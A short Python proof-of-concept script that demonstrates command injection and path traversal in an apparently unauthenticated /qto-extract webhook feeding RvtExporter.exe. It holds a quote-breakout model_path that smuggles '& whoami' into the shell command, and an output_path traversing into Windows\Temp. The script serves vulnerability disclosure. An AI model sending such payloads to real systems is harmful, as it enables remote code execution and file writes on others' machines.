#!/usr/bin/env python3
"""PoC: unauthenticated /qto-extract webhook → Execute Command RCE.

Source: 1_DDC_Toolkit/BIM-Analysis/ifc-qto-extraction/SKILL.md
  trigger webhook path /qto-extract
  command: "C:\\DDC\\RvtExporter.exe" "{{$json.model_path}}" complete bbox schedule
  write: path "={{$json.output_path}}"

Attacker POSTs model_path that breaks out of the quoted argv into the shell.
"""
from __future__ import annotations

def build_execute_command(model_path: str) -> str:
    # Literal template from SKILL.md Execute Command node
    return f'"C:\\DDC\\RvtExporter.exe" "{model_path}" complete bbox schedule'


def main() -> None:
    payload = {
        "model_path": 'C:\\tmp\\x.rvt" & whoami > C:\\tmp\\qto_rce.txt & rem "',
        "output_path": "C:\\tmp\\..\\..\\Windows\\Temp\\qto_traversal.html",
    }
    cmd = build_execute_command(payload["model_path"])
    print("POST /webhook/qto-extract JSON:")
    print(json.dumps(payload, indent=2))
    print()
    print("Expanded Execute Command:")
    print(cmd)
    assert "& whoami" in cmd
    print()
    print("OK: quote-breakout reaches shell metacharacters (RCE).")
    print("Also: output_path is attacker-controlled Write Binary File sink (path traversal).")


if __name__ == "__main__":
    import json
    main()
